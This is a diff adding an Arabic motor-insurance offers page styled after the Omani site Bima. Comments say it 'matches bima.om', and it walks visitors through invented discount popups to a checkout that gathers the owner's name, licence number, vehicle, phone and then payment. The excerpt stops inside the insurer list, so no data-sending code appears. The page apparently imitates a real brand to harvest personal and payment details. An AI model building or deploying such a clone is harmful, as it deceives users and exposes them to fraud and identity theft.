@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>بيمة</title>
+    <link rel="stylesheet" href="assets/css/bootstrap.min.css">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <link rel="stylesheet" href="assets/css/responsive.css">
+    <link rel="stylesheet" href="assets/css/site_common.css">
+    <link rel="stylesheet" href="assets/css/site.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { background-color: #f5f7fa; font-family: 'ibmplexsansarabic-regular', 'Tajawal', Arial, sans-serif; color:#333; font-size:18px; }
+        .top-bar { background-color: #fff; padding: 14px 0; border-bottom: 1px solid #eee; }
+        .header-row { display:flex; align-items:center; justify-content:space-between; }
+        .brand-logo img { height:54px; width:auto; display:block; }
+        .veh-summary-spacer { flex:1; }
+        .veh-summary { display:flex; gap:30px; justify-content:flex-start; flex:1; }
+        .veh-summary .lbl { color:#9a9a9a; font-size:12px; }
+        .veh-summary .val { font-weight:700; font-size:18px; }
+        .step-indicator { max-width: 600px; margin: 26px auto 30px; width: 100%; }
+        .step-circles { display: grid; grid-template-columns: 34px 1fr 34px 1fr 34px 1fr 34px; align-items: center; }
+        .step-labels { display: grid; grid-template-columns: repeat(4, 1fr); margin-top: 8px; }
+        .step-label { text-align: center; color: #b9b9b9; font-size: 15px; font-weight: 600; }
+        .step-label.active, .step-label.done { color: #2e9e4f; }
+        .step-circle { width: 34px; height: 34px; border-radius: 50%; border: 2px solid #d3d3d3; display: flex; justify-content: center; align-items: center; font-weight: 700; font-size:15px; background:#fff; color:#b9b9b9; box-sizing:border-box; }
+        .step-circle.active, .step-circle.done { border-color: #2e9e4f; background-color: #2e9e4f; color: #fff; }
+        .step-line { height: 3px; background-color: #d8d8d8 !important; background-image: none !important; background: #d8d8d8 !important; margin: 0 8px; border: 0 !important; box-shadow: none !important; }
+        .step-line.done { background: #2e9e4f !important; background-color: #2e9e4f !important; }
+        /* kill legacy pseudo line from site_common.css */
+        .step-circle::before, .step-circle::after { content: none !important; display: none !important; }
+
+        .cover-tabs { display:flex; flex-direction:row-reverse; gap:10px; max-width:620px; margin:0 auto 26px; }
+        .cover-tab { flex:1; text-align:center; padding:16px; border-radius:8px; border:1px solid #d7dbe0; background:#fff; cursor:pointer; font-weight:700; color:#444; transition:.15s; font-size:20px; }
+        .cover-tab.active { background:#1c1c1c; color:#fff; border-color:#1c1c1c; }
+        .renewal-notice { max-width:1180px; margin:0 auto 22px; background:#fcf8e3; color:#8a6d3b; border:1px solid #faf2cc; border-radius:8px; padding:14px 18px; font-size:16px; font-weight:600; text-align:center; line-height:1.9; }
+
+        .offer-card { border: 1px solid #e0e0e0; border-radius: 10px; padding: 20px; margin-bottom: 20px; background-color: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.04); }
+        .offer-head { display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:10px; border-bottom:1px solid #f0f0f0; padding-bottom:14px; margin-bottom:14px; }
+        .company { display:flex; align-items:center; gap:10px; }
+        .company img { width:54px; height:54px; object-fit:contain; border-radius:8px; background:#fff; padding:2px; }
+        .company .name { font-weight:800; font-size:23px; }
+        .badges { display:flex; flex-wrap:wrap; gap:6px; justify-content:flex-end; }
+        .badge-soft { background-color: #f1f3f5; color: #555; border: 1px solid #e3e6e9; padding: 5px 11px; border-radius: 6px; font-size: 14px; }
+        .badge-green { background:#e8f6ea; color:#2e7d32; border-color:#cdeccf; }
+        .cover-title { color:#777; font-weight:700; margin-bottom:8px; font-size:18px; }
+        .features-list { list-style: none; padding: 0; margin: 0; display: flex; flex-wrap: wrap; }
+        .features-list li { width: 50%; margin-bottom: 11px; color: #555; font-size:17px; }
+        .features-list li i { color: #4caf50; margin-left: 6px; }
+        .val-chip { background:#eafaf0; color:#2e7d32; border:1px solid #bfe6c9; border-radius:6px; padding:5px 10px; font-size:16px; display:inline-block; margin-bottom:10px; }
+        .price-row { display:flex; justify-content:space-between; align-items:flex-end; flex-wrap:wrap; gap:14px; border-top:1px solid #f0f0f0; padding-top:14px; margin-top:6px; }
+        .price-base { color:#98a2b3; font-size:15px; }
+        .price-amount { font-weight:700; color:#16a34a; }
+        .price-amount .tax { color:#98a2b3; font-weight:600; }
+        .price-total { font-size:15px; color:#98a2b3; }
+        .price-total b { font-size:30px; color:#475467; display:block; font-weight:700; }
+        .price-total .total-old { font-size:22px; color:#e53935; font-weight:700; text-decoration:line-through; }
+        .price-total .total-wrap { display:flex; align-items:baseline; gap:8px; justify-content:flex-start; }
+        .price-total .total-amount { display:inline-block; }
+        .omr-sym { display:inline-block; width:1.05em; height:.72em; vertical-align:-0.02em; margin:0 2px; background-color:currentColor; -webkit-mask:url('img/omr-symbol.svg') no-repeat center / contain; mask:url('img/omr-symbol.svg') no-repeat center / contain; }
+        .btn-buy { background-color: #4caf50; color: white; border: none; padding: 13px 44px; border-radius: 6px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; font-size:19px; }
+        .btn-buy:hover { background-color: #439a47; color:#fff; }
+        .opts { margin-top:8px; }
+        .opts .opt { display:block; color:#555; font-size:16px; margin-bottom:6px; }
+        .opts .opt input { margin-left:6px; }
+
+        /* ===== Checkout owner-name modal (matches bima.om) ===== */
+        .co-overlay { position: fixed; inset: 0; background: rgba(0,0,0,.45); display:flex; align-items:flex-start; justify-content:center; opacity:0; pointer-events:none; transition:opacity .22s ease; z-index:10000; overflow-y:auto; padding:30px 12px; }
+        .co-overlay.is-open { opacity:1; pointer-events:auto; }
+        .co-modal { width: min(520px, 100%); background:#fff; border-radius:14px; position:relative; transform:translateY(-20px); transition:transform .25s ease; box-shadow:0 16px 50px rgba(0,0,0,.25); margin:auto; }
+        .co-overlay.is-open .co-modal { transform:translateY(0); }
+        .co-close { position:absolute; top:-14px; right:auto; left:18px; width:46px; height:46px; border-radius:12px; border:2px solid rgba(45,28,28,.85); background:#fff; cursor:pointer; font-size:22px; line-height:1; display:flex; align-items:center; justify-content:center; color:#2d1c1c; z-index:3; box-shadow:0 4px 10px rgba(0,0,0,.12); }
+        .co-body { padding:26px 24px 24px; }
+        .co-title { font-size:1.35rem; font-weight:700; text-align:right; margin-bottom:14px; color:#1c1c1c; }
+        .co-card-wrap { position:relative; width:100%; max-width:360px; margin:0 auto 0; }
+        .co-card-wrap img { width:100%; height:auto; display:block; }
+        .co-owner-box { background:#f7f7f7; padding:12px 12px 10px; margin-top:10px; border-radius:10px 10px 0 0; position:relative; z-index:2; }
+        .co-owner-input { width:85%; display:block; margin:0 auto; border:1px solid #d9d9d9; border-radius:8px; padding:14px 12px 6px; font-size:16px; background:#fff; text-align:center; outline:none; }
+        .co-owner-input:focus { border-color:#2e9e4f; }
+        .co-owner-label { display:block; text-align:center; color:#666; font-size:14px; margin-top:6px; }
+        .co-driver-box { background:#f7f7f7; border-radius:0 0 10px 10px; padding:10px 12px 14px; }
+        .co-driver-box h6 { font-weight:700; margin:6px 0 6px; font-size:1rem; color:#1c1c1c; text-align:right; }
+        .co-driver-box p { font-size:12px; color:gray; margin:0; text-align:right; }
+        .co-total { text-align:center; font-size:1.05rem; margin:18px 0 6px; color:#475467; }
+        .co-total .co-old { color:#e53935; text-decoration:line-through; margin:0 6px; font-weight:600; }
+        .co-total .co-new { color:#000; font-weight:700; }
+        .co-links { text-align:center; font-size:12px; margin-bottom:16px; }
+        .co-links a { color:#2e9e4f; text-decoration:underline; margin:0 3px; }
+        .co-pay-btn { width:100%; background:#1c1c1c; color:#fff; border:none; border-radius:6px; padding:16px; font-size:1.1rem; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
+        .co-pay-btn:hover { background:#000; }
+        .opt-title { color:#9a9a9a; font-size:12px; margin:10px 0 6px; }
+
+        /* ---- Checkout review step (كل شيء تمام) ---- */
+        #coReviewStep { display:none; }
+        .rv-title-wrap { text-align:center; margin-bottom:18px; }
+        .rv-title-wrap h4 { font-size:1.35rem; font-weight:800; color:#1c1c1c; margin:0 0 8px; }
+        .rv-title-wrap h4 .name { color:#2e9e4f; }
+        .rv-title-wrap p { color:#667085; font-size:.9rem; margin:0; line-height:1.6; }
+        .rv-section { margin-bottom:18px; }
+        .rv-section-title { display:flex; align-items:center; justify-content:space-between; color:#1c1c1c; font-weight:700; font-size:1.02rem; margin-bottom:6px; }
+        .rv-section-title .left { display:flex; align-items:center; gap:8px; }
+        .rv-section-title .left i { color:#2e9e4f; }
+        .rv-section-title > i { color:#c4c4c4; }
+        .rv-chip { display:flex; align-items:center; justify-content:space-between; background:#f6f7f9; border-radius:12px; padding:14px 16px; margin-bottom:10px; }
+        .rv-chip .lead { display:flex; align-items:center; gap:12px; flex-direction:row-reverse; }
+        .rv-chip .icon { width:38px; height:38px; border-radius:50%; background:#eef0f3; display:flex; align-items:center; justify-content:center; color:#667085; flex-shrink:0; }
+        .rv-chip .label { color:#667085; font-size:.92rem; }
+        .rv-chip .value { color:#1d3b8b; font-weight:700; font-size:.95rem; }
+        .rv-policy { display:flex; align-items:center; gap:14px; background:#f4f6ff; border-radius:14px; padding:16px; flex-direction:row-reverse; }
+        .rv-policy .logo { width:54px; height:54px; object-fit:contain; flex-shrink:0; }
+        .rv-policy .price { font-size:1.25rem; font-weight:800; color:#1c1c1c; margin:0 0 4px; display:flex; align-items:center; gap:6px; justify-content:flex-end; }
+        .rv-policy .price .old { color:#e53935; text-decoration:line-through; font-size:.95rem; font-weight:700; }
+        .rv-policy .line { color:#475467; font-size:.86rem; margin:2px 0; text-align:right; }
+        .rv-policy .brand { color:#1d3b8b; font-weight:700; font-size:.9rem; margin:2px 0 0; text-align:right; }
+        .rv-buttons { display:flex; flex-direction:column; gap:12px; margin-top:18px; }
+        .rv-btn-primary { width:100%; background:#34a853; color:#fff; border:none; border-radius:8px; padding:15px; font-size:1.08rem; font-weight:700; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
+        .rv-btn-primary:hover { background:#2e9e4f; }
+        .rv-btn-secondary { width:100%; background:#f6f7f9; color:#1d3b8b; border:none; border-radius:8px; padding:14px; font-size:1rem; font-weight:700; cursor:pointer; }
+        .rv-btn-secondary:hover { background:#eef0f3; }
+
+        /* ---- Offers loading screen ---- */
+        #offersLoading { text-align:center; padding:34px 16px 70px; }
+        #offersLoading .loading-text { color:#3a3a3a; font-size:20px; font-weight:600; margin-top:14px; }
+        .dots-anim { display:inline-block; }
+        .dots-anim span { display:inline-block; width:7px; height:7px; margin:0 2px; border-radius:50%; background:#2e9e4f; opacity:.3; animation: bimaDots 1.2s infinite ease-in-out; }
+        .dots-anim span:nth-child(2) { animation-delay:.2s; }
+        .dots-anim span:nth-child(3) { animation-delay:.4s; }
+        @keyframes bimaDots { 0%,80%,100% { opacity:.3; transform:translateY(0);} 40% { opacity:1; transform:translateY(-5px);} }
+
+        /* ---- Details link top-left of card (matches original) ---- */
+        .card-top { display:flex; justify-content:flex-end; margin-bottom:6px; }
+        .details-link { display:inline-flex; align-items:center; gap:6px; color:#1d77c4; font-weight:700; font-size:17px; cursor:pointer; background:none; border:none; padding:0; }
+        .details-link i { font-size:15px; }
+        .details-link:hover { text-decoration:underline; }
+        .company-wrap { display:flex; flex-direction:column; }
+
+        /* ---- Provider details modal ---- */
+        .pd-overlay { position:fixed; inset:0; background:rgba(60,70,80,0.55); display:none; z-index:1000; }
+        .pd-overlay.open { display:block; }
+        .pd-modal { position:fixed; top:24px; bottom:24px; left:50%; transform:translateX(-50%); width:760px; max-width:calc(100% - 24px); background:#fff; border-radius:10px; box-shadow:0 10px 40px rgba(0,0,0,0.25); display:flex; flex-direction:column; z-index:1001; overflow:hidden; direction:rtl; text-align:right; }
+        .pd-header { display:flex; flex-direction:row-reverse; align-items:center; justify-content:space-between; padding:18px 22px; border-bottom:1px solid #eee; flex:0 0 auto; }
+        .pd-header h3 { margin:0; font-size:21px; font-weight:700; color:#333; }
+        .pd-close-x { width:46px; height:46px; border:1px solid #e3e3e3; background:#fff; border-radius:8px; font-size:22px; line-height:1; cursor:pointer; color:#444; display:flex; align-items:center; justify-content:center; }
+        .pd-close-x:hover { background:#f5f5f5; }
+        .pd-body { padding:22px 26px; overflow-y:auto; flex:1 1 auto; }
+        .pd-company { display:flex; align-items:center; gap:12px; justify-content:flex-start; flex-direction:row; margin-bottom:14px; }
+        .pd-company img { width:54px; height:54px; object-fit:contain; }
+        .pd-company .pd-name { font-size:22px; font-weight:700; color:#333; }
+        .pd-about { color:#555; font-size:15px; line-height:2; text-align:justify; margin-bottom:18px; }
+        .pd-downloads { display:flex; gap:16px; justify-content:center; flex-wrap:wrap; margin-bottom:22px; }
+        .pd-dl { display:inline-flex; align-items:center; gap:8px; border:1px solid #1d77c4; color:#1d77c4; background:#fff; border-radius:8px; padding:12px 18px; font-weight:600; font-size:16px; cursor:pointer; text-decoration:none; }
+        .pd-dl:hover { background:#f0f7fd; color:#1d77c4; }
+        .pd-tabs { display:flex; gap:22px; justify-content:center; flex-wrap:wrap; border-bottom:1px solid #eee; padding-bottom:12px; margin-bottom:20px; }
+        .pd-tab { background:none; border:none; font-size:17px; font-weight:700; color:#9a9a9a; cursor:pointer; padding:4px 2px; }
+        .pd-tab.active { color:#2e9e4f; border-bottom:2px solid #2e9e4f; }
+        .pd-cols { display:grid; grid-template-columns:1fr 1fr; gap:30px; }
+        .pd-col h4 { font-size:19px; font-weight:700; color:#333; margin:0 0 14px; }
+        .pd-item { margin-bottom:16px; }
+        .pd-item .pd-item-title { font-weight:700; color:#333; font-size:16px; margin-bottom:4px; }
+        .pd-item .pd-item-desc { color:#8a8a8a; font-size:14px; line-height:1.8; }
+        .pd-footer { padding:14px 22px; border-top:1px solid #eee; flex:0 0 auto; }
+        .pd-close-btn { border:1px solid #d3d3d3; background:#fff; border-radius:8px; padding:10px 26px; font-size:16px; font-weight:600; color:#444; cursor:pointer; }
+        .pd-close-btn:hover { background:#f5f5f5; }
+        @media (max-width:640px){ .pd-cols { grid-template-columns:1fr; } }
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/* Simple and perfect mobile fix for stepper */
+@media (max-width: 768px) {
+    .step-indicator {
+        width: 92% !important;
+        max-width: 100% !important;
+        margin: 15px auto 20px !important;
+        padding: 0 !important;
+        box-sizing: border-box !important;
+    }
+    .step-circles {
+        grid-template-columns: 26px 1fr 26px 1fr 26px 1fr 26px !important;
+    }
+    .step-circle {
+        width: 26px !important;
+        height: 26px !important;
+        font-size: 12px !important;
+    }
+    .step-labels {
+        grid-template-columns: repeat(4, 1fr) !important;
+    }
+    .step-label {
+        font-size: 11px !important;
+        text-align: center !important;
+    }
+    .step-line {
+        margin: 0 4px !important;
+    }
+}
+
+</style>
+</head>
+<body>
+    <div class="top-bar">
+        <div class="container header-row">
+            <div class="veh-summary" id="vehSummary">
+                <div><div class="lbl">رقم اللوحة</div><div class="val" id="plateVal">-</div></div>
+                <div><div class="lbl">موديل السيارة</div><div class="val" id="modelVal">-</div></div>
+            </div>
+            <a href="/bima-home.html" class="brand-logo"><img src="img/logo/bima-logo.svg" alt="بيمة"></a>
+            <div class="veh-summary-spacer"></div>
+        </div>
+    </div>
+
+    <div class="container" style="max-width:1180px; margin:0 auto;">
+        <div class="step-indicator" dir="rtl">
+            <div class="step-circles">
+                <div class="step-circle done">1</div>
+                <div class="step-line done"></div>
+                <div class="step-circle active">2</div>
+                <div class="step-line"></div>
+                <div class="step-circle">3</div>
+                <div class="step-line"></div>
+                <div class="step-circle">4</div>
+            </div>
+            <div class="step-labels">
+                <div class="step-label done">تفاصيل</div>
+                <div class="step-label active">العروض</div>
+                <div class="step-label">إتمام الشراء</div>
+                <div class="step-label">رفع الصور</div>
+            </div>
+        </div>
+
+        <div id="offersLoading">
+            <div class="loading-text">خلك مستريح ، الحين نشوف لك افضل العروض <span class="dots-anim"><span></span><span></span><span></span></span></div>
+        </div>
+
+        <div id="offersContent" style="display:none;">
+            <div class="cover-tabs">
+                <div class="cover-tab" id="tabComp" onclick="bimaSwitchTab('comprehensive')">تأمين شامل</div>
+                <div class="cover-tab" id="tabThird" onclick="bimaSwitchTab('third')">تأمين طرف ثالث</div>
+            </div>
+
+            <div class="renewal-notice">سيتم إعتبار تاريخ تجديد وثيقة التأمين إبتداءً من إنتهاء الوثيقة القديمة</div>
+
+            <div id="offersContainer"></div>
+
+            <div class="text-center" style="margin:20px 0 60px;">
+                <a href="/motor-request.html" style="color:#777;">&rarr; تعديل البيانات</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Provider details modal -->
+    <div class="pd-overlay" id="pdOverlay" onclick="if(event.target===this)bimaCloseDetails()">
+        <div class="pd-modal" role="dialog" aria-modal="true">
+            <div class="pd-header">
+                <button class="pd-close-x" onclick="bimaCloseDetails()" aria-label="إغلاق">&times;</button>
+                <h3>تفاصيل مزود التأمين</h3>
+            </div>
+            <div class="pd-body" id="pdBody"></div>
+            <div class="pd-footer">
+                <button class="pd-close-btn" onclick="bimaCloseDetails()">إغلاق</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- No-claim discount promotional popup -->
+    <div class="nc-overlay" id="noClaimPopup" aria-hidden="true">
+        <div class="nc-sheet" role="dialog" aria-modal="true" aria-labelledby="ncTitle">
+            <button type="button" class="nc-close" aria-label="Close" onclick="closeNoClaimPopup()">&times;</button>
+            <div class="popup-content" data-loaded="true">
+                <div class="nc-card" dir="rtl">
+                    <!-- Top tags -->
+                    <div class="nc-top">
+                        <span class="nc-tag">بدون مطالبات</span>
+                        <span class="nc-tag">مكافآت</span>
+                    </div>
+                    <div class="row nc-row">
+                        <!-- Left text -->
+                        <div class="col-6 col-md-6 nc-left">
+                            <h3 class="nc-title" id="ncTitle">أنت مؤهل للحصول على خصم يصل إلى <span class="nc-highlight">30٪</span>
+                                <p class="nc-text">سجلك الخالي من الحوادث يتيح لك عروض مصممة خصيصًا لك من شركات التأمين😃.</p>
+                                <div class="nc-actions">
+                                    <button type="button" class="nc-btn" style="font-size:18px" onclick="closeNoClaimPopup()">استمر</button>
+                                </div>
+                            </h3>
+                        </div>
+                        <!-- Right illustration -->
+                        <div class="col-6 col-md-6 nc-right" aria-hidden="true">
+                            <img src="img/claim free discount.png" width="270px">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Checkout: enter owner name (matches bima.om) -->
+    <div class="co-overlay" id="checkoutModal" aria-hidden="true">
+        <div class="co-modal" role="dialog" aria-modal="true" aria-labelledby="coTitle" dir="rtl">
+            <button type="button" class="co-close" aria-label="إغلاق" onclick="closeCheckoutModal()">&times;</button>
+            <div class="co-body">
+                <div id="coNameStep">
+                    <div class="co-title" id="coTitle">&#9889;أدخل الاسم كما هو في ملكية السيارة &#129706;</div>
+                    <div class="co-card-wrap">
+                        <img src="img/MulkiaBackSide3.png" alt="">
+                    </div>
+                    <div class="co-owner-box">
+                        <input type="text" class="co-owner-input" id="coOwnerName" maxlength="40" autocomplete="off" placeholder="">
+                        <label class="co-owner-label">الاسم الكامل لمالك السيارة ( <b>&#129706; <span id="coOwnerId">91555838</span></b> )</label>
+                    </div>
+                    <div class="co-driver-box">
+                        <h6>لاداعي لإضافة اسماء سائقين</h6>
+                        <p>بناءً على التعديلات الجديدة على وثيقة التأمين الموحدة للمركبات، تم تحديث تعريف السائق ليشمل أي شخص يقود المركبة برخصة سارية، مما يلغي تقييد التأمين بأسماء سائقين محددين مسبقاً في الوثيقة.</p>
+                    </div>
+                    <div class="co-total">المبلغ الإجمالي ر.ع <span class="co-old" id="coOldPrice"></span><span class="co-new" id="coNewPrice"></span></div>
+                    <div class="co-links">
+                        <a href="#" onclick="return false;">الأحكام والشروط</a> ,
+                        <a href="#" onclick="return false;">تحميل نموذج عرض التأمين</a> ,
+                        <a href="#" onclick="return false;">تحميل نموذج الوثيقة الموحدة</a>
+                    </div>
+                    <button type="button" class="co-pay-btn" onclick="checkoutProceed()">تابع للدفع <i class="fas fa-chevron-left"></i></button>
+                </div>
+
+                <div id="coReviewStep">
+                    <div class="rv-title-wrap">
+                        <h4>&#128077;كل شيء تمام <span class="name" id="rvFirstName"></span></h4>
+                        <p>قم بالتأكد من صحة البيانات قبل الدفع, عدم الإفصاح عن المعلومات الصحيحة قد يلغي طلبك.</p>
+                    </div>
+                    <div class="rv-section">
+                        <div class="rv-section-title">
+                            <div class="left"><i class="fa-solid fa-user"></i><span>معلومات مالك المركبة</span></div>
+                            <i class="fa-regular fa-circle-question"></i>
+                        </div>
+                        <div class="rv-chip">
+                            <div class="lead"><span class="icon"><i class="fa-solid fa-user"></i></span>
+                                <div><span class="label">الاسم:</span> <span class="value" id="rvName"></span></div>
+                            </div>
+                        </div>
+                        <div class="rv-chip">
+                            <div class="lead"><span class="icon"><i class="fa-solid fa-address-card"></i></span>
+                                <div><span class="label">رقم رخصة القيادة:</span> <span class="value" id="rvLicense"></span></div>
+                            </div>
+                        </div>
+                        <div class="rv-chip">
+                            <div class="lead"><span class="icon"><i class="fa-solid fa-car"></i></span>
+                                <div><span class="label">المركبة:</span> <span class="value" id="rvVehicle"></span></div>
+                            </div>
+                        </div>
+                        <div class="rv-chip">
+                            <div class="lead"><span class="icon"><i class="fa-solid fa-phone"></i></span>
+                                <div><span class="label">رقم الهاتف:</span> <span class="value" id="rvPhone"></span></div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="rv-section">
+                        <div class="rv-section-title">
+                            <div class="left"><i class="fa-regular fa-file-lines"></i><span>تفاصيل التأمين</span></div>
+                            <i class="fa-regular fa-circle-question"></i>
+                        </div>
+                        <div class="rv-policy">
+                            <img class="logo" id="rvLogo" src="" alt="" onerror="this.style.display='none'">
+                            <div style="flex:1">
+                                <p class="price"><span class="old" id="rvOldPrice"></span><span id="rvNewPrice"></span> ر.ع</p>
+                                <p class="line">تأمين طرف ثالث</p>
+                                <p class="line">التثمين: 0 ر.ع</p>
+                                <p class="brand" id="rvBrand"></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="rv-buttons">
+                        <button type="button" class="rv-btn-primary" onclick="reviewProceedPay()">تابع للدفع <span id="rvPayAmount"></span> ر.ع</button>
+                        <button type="button" class="rv-btn-secondary" onclick="reviewBack()">الرجوع للتعديل</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ---- Insurance companies catalog ----
+        // Comprehensive: rate = percentage of vehicle value (base premium). Tax = 5% of base.
+        var COMPANIES = [
+            { name: 'شركة التأمين الإيرانية', logo: 'assets/images/insurers/iran.png', rate: 0.0680, badges: ['تعديل بعد الشراء: 1-4 أيام', 'لاحاجة لصور المركبة', 'سرعة الاصدار: 15 د', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 2'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','التأمين الإلزامي','تغطية الكوارث الطبيعية (STF)','الفقد والتلف','تغطية الركاب','المصاريف الطبية','الحريق/السرقة/سرقة جسم المركبة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 42 },
+            { name: 'أورينت للتأمين', logo: 'assets/images/insurers/orient.png', rate: 0.0765, badges: ['تعديل بعد الشراء: 1-4 أيام', 'ضمان بيمة: نفس سعر الشركة', 'تخضع للموافقة (خلال ٢٤ ساعة)'],
+              comp: ['تغطية السائق والعائلة','دولة الإمارات (سنة كاملة)','المصاريف الطبية','المساعدة على الطريق','مسؤولية الطرف الثالث','الإصابة الجسدية للطرف الثالث','أضرار مركبة الطرف الثالث','تغطية الركاب','تغطية الكوارث الطبيعية (STF)','السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 45 },
+            { name: 'العربية فالكون للتأمين', logo: 'assets/images/insurers/falcon.png', rate: 0.0837, badges: ['تعديل بعد الشراء: 1-4 أيام', 'لاحاجة لصور المركبة', 'سرعة الاصدار: 15 د', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 8'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','التأمين الإلزامي','تغطية الكوارث الطبيعية (STF)','الفقد والتلف','تغطية الركاب'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 44 },
+            { name: 'الخليج GIG', logo: 'assets/images/insurers/gig.jpg', rate: 0.0887, badges: ['تأمين فوري', 'تعديل بعد الشراء: سريع', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 6'],
+              comp: ['المصاريف الطبية','تغطية السائق والعائلة','تغطية الركاب','مسؤولية الطرف الثالث','الفقد والتلف','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','الحريق','السرقة','الإصلاح المعتمد'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 47 },
+            { name: 'تكافل عمان للتأمين', logo: 'assets/images/insurers/takafuloman.jpg', rate: 0.1036, badges: ['تأمين فوري', 'تعديل بعد الشراء: سريع', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 11'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','تغطية الكوارث الطبيعية (STF)','تغطية الركاب','الفقد والتلف','التأمين الإلزامي','الإصابة الجسدية للطرف الثالث','أضرار مركبة الطرف الثالث','الحريق/السرقة/سرقة جسم المركبة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 48 },
+            { name: 'ظفار للتأمين', logo: 'assets/images/insurers/dhofar.jpg', rate: 0.0910, badges: ['تعديل بعد الشراء: 1-4 أيام', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 9'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','التأمين الإلزامي','الفقد والتلف','تغطية الركاب','الحريق','السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 46 },
+            { name: 'ليڤا للتأمين', logo: 'assets/images/insurers/liva.png', rate: 0.0955, badges: ['تأمين فوري', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 10'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','تغطية الكوارث الطبيعية (STF)','الفقد والتلف','تغطية الركاب','التأمين الإلزامي','الحريق/السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 47 },
+            { name: 'سكون للتأمين', logo: 'assets/images/insurers/sukoon.jpg', rate: 0.0985, badges: ['تعديل بعد الشراء: 1-4 أيام', 'لاحاجة لصور المركبة', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 7'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','الفقد والتلف','تغطية الركاب','التأمين الإلزامي','الحريق','السرقة'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 46 },
+            { name: 'النصر للتأمين', logo: 'assets/images/insurers/nasr.jpg', rate: 0.0925, badges: ['تعديل بعد الشراء: 1-4 أيام', 'ضمان بيمة: نفس سعر الشركة', 'الفروع: 5'],
+              comp: ['تغطية السائق والعائلة','تأمين شامل','المصاريف الطبية','التأمين الإلزامي','الفقد والتلف','تغطية الركاب'],
+              third: ['المصاريف الطبية','تغطية الركاب','مسؤولية الطرف الثالث','أضرار مركبة الطرف الثالث','الإصابة الجسدية للطرف الثالث','مصاريف الإسعافات الأولية','الكوارث الطبيعية (لغاية 5000 ر.ع)'], thirdPrice: 45 },
+            { name: 'الهندية الجديدة للتأمين', logo: 'assets/images/insurers/newindia.png', rate: 0.0795, badges: ['تعديل بعد الشراء: سريع', 'لاحاجة لصور المركبة', 'سرعة الاصدار: 15 د', 'ضمان بيمة: نفس سعر الشركة'],
+              comp: ['تغطية السائق والعائلة - ر.ع 2.9','المصاريف الطبية','الإصابة الجسدية للطرف الثالث','تغطية الركاب','الكوارث الطبيعية (لغاية 5000 ر.ع) - ر.ع 4.7','تأمين شامل','الفقد والتلف','التأمين الإلزامي'],
